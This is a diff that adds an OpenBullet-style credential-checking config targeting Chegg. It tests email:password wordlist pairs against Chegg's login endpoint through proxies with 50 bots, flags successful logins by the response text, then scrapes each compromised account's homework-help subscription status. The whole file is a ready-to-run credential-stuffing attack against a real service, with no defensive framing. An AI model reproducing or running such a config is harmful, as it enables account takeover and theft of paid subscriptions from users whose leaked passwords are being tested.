@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Chegg",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-11T21:11:05.3694946-07:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "Email",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.chegg.com/auth/_ajax/auth/v1/login?clientId=CHGG" AutoRedirect=FALSE 
+  CONTENT "clientId=CHGG&redirect_uri=&state=&responseType=&email=<USER>&password=<PASS>&version=2.100.0&profileId=CHGG" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.chegg.com" 
+  HEADER "Referer: https://www.chegg.com/auth?action=login&redirect=https%3A%2F%2Fwww.chegg.com%2F&reset_password=0" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"result\":{\"authMethod\":\"Chegg\",\"uuid\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Email and password do not match." 
+    
+REQUEST GET "https://www.chegg.com/my/account" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.chegg.com" 
+  HEADER "Referer: https://www.chegg.com/" 
+PARSE "<SOURCE>" LR "C.global.hasHwhSubscription =" ";" Recursive=FALSE -> CAP "Subscription"
+PARSE "<SOURCE>" LR "C.global.hwhSubscriptionStatus =" ";" Recursive=FALSE -> CAP "Subscription status"
